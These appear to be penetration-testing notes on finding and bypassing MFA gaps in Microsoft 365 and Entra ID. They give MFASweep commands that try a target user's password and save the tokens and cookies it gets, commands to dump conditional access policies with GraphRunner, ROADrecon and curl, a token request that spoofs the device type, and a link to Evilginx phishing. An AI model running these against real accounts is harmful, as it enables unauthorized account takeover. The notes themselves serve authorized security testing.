___

### Identify MFA Gaps
---

With MFASweep
https://github.com/dafthack/MFASweep

Attempt to authenticate to the 

- Microsoft Graph API
- Azure Service Management API
- Microsoft 365 Exchange Web Services
- Microsoft 365 Web Portal with both a desktop browser and mobile.
- Microsoft 365 Active Sync

If any authentication methods result in success, tokens and/or cookies will be written to AccessTokens.json. (Currently does not log cookies or tokens for EWS, ActiveSync, and ADFS)
```powershell
. .\MFASweep.ps1
Invoke-MFASweep -Username targetuser@targetdomain.com -Password Winter2024 -WriteTokens 
```

```
Invoke-MFASweep -Username targetuser@targetdomain.com -Password Winter2024 -Recon
```

> [!NOTE] Note
> The user agents in MFA sweep are static and actually unique (on purpose). They should be changed. 

**Dumping Conditional Access Policies**

> [!NOTE] Deprecation
> The AADGraph api is now deprecated and normal users are unable to query the policy


**Have user?** Try to dump conditional access policies to check MFA policies.

```powershell
. .\GraphRunner.ps1
Invoke-DumpCaps
```

RoadRECON
https://github.com/dirkjanm/ROADtools
```bash
roadrecon plugin policies 
firefox ./caps.html
```

with Curl:

```bash
curl -sSf -H "Authorization: Bearer $aadgraphtoken" 'https://graph.windows.net/<tenantID>/policies?api-version=1.61-internal' | jq
``` 

### Bypass Methods
---
#### Device Based

https://learn.microsoft.com/en-us/entra/identity/conditional-access/concept-conditional-access-conditions#device-platforms

**OS allow listing**: Sometimes tenants will be configured to bypass MFA for a particular OS (in the case of automation systems, breakglass accounts, etc...)

**GraphRunner**

```powershell
Get-GraphTokens -Device <Mac,AndroidMobile,etc...>
```

#### Phishing

[[phishing#Evilginx]]